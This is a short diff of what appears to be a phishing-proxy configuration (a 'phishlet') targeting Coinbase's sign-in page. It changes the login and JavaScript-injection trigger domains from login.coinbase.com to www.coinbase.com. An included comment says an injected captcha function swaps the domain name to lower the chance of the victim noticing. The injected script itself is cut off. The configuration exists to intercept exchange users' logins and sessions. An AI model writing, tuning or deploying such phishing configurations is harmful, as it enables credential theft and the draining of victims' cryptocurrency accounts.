@@ -44,7 +44,7 @@ force_post:
     type: 'post'
 
 login:
-  domain: 'login.coinbase.com'
+  domain: 'www.coinbase.com'
   path: '/signin?'
 
 
@@ -55,7 +55,7 @@ login:
 # "function hcaptcha()" will replace the domain name during the captcha validation to decrease the possibility of getting caught by the user.
 
 js_inject:
-  - trigger_domains: ["login.coinbase.com"]
+  - trigger_domains: ["www.coinbase.com"]
     trigger_paths: ["/signin?"]
     trigger_params: [domain]
     script: |
